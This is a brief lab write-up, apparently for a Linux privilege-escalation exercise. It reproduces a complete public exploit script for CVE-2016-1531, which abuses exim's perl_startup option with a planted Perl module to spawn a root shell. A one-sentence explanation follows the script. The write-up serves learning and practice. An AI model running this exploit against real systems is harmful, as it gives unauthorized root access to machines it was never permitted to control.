***

Author : dxWiz
Date : 17 Mar 2022

***

# Task 11 SUID / SGID Executables - Known Exploits 

Result returned from exploit DB

    #!/bin/sh
    # CVE-2016-1531 exim <= 4.84-3 local root exploit
    # ===============================================
    # you can write files as root or force a perl module to
    # load by manipulating the perl environment and running
    # exim with the "perl_startup" arguement -ps. 
    #
    # e.g.
    # [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
    # [ CVE-2016-1531 local root exploit
    # sh-4.3# id
    # uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
    # 
    # -- Hacker Fantastic 
    echo [ CVE-2016-1531 local root exploit
    cat > /tmp/root.pm << EOF
    package root;
    use strict;
    use warnings;

    system("/bin/sh");
    EOF
    PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps


The overall idea is to create a perl module with the extension of .pm and run exploitable exim with the argument -ps to get root shell.

# Task 12 SUID / SGID Executables - Shared Object Injection 
